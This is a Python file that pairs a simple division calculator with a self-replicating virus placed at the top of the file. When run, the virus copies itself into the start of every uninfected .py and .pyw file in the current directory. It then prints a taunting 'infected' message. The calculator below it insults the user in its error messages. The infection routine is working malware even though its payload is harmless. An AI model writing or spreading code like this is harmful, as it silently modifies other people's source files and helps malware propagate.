# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)


def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")


malicious_code()

# VIRUS SAYS BYE!
while True:
    a = int(input("a = "))
    b = int(input("b = "))
    try:
        res = a / b
    except ZeroDivisionError as e:
        print(f"You can't divide it with zero you moron, did you even pay attention in math class? \nError: {e}")
    except ValueError as e:
        print(f"Seriously dude are you a baby or smth, cause this is a calculator! \nError: {e}")
    else:
        print(f"a : b = {res}")
    finally:
        print("Done!")
    quit = input("Quit ? (yes / no) ")
    if quit == "yes":
        break